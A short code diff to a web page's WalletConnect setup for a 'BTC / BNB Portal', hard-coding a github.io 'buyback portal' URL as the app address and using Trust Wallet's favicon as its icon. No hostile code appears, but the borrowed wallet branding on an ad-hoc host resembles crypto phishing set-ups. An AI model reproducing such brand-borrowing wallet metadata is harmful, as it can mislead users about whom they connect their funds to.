@@ -349,19 +349,14 @@ async function initializeWalletConnect() {
             description:
               "BTC / BNB Portal",
 
-            url:
-              window.location.origin +
-              window.location.pathname,
+           url: "https://bitcoinbtcbuybackportal-commits.github.io",
 
             icons: [
               "https://trustwallet.com/favicon.ico"
             ],
 
-            redirect: {
-              universal:
-                window.location.origin +
-                window.location.pathname
-            }
+            
+              
           },
 
           includeWalletIds: [
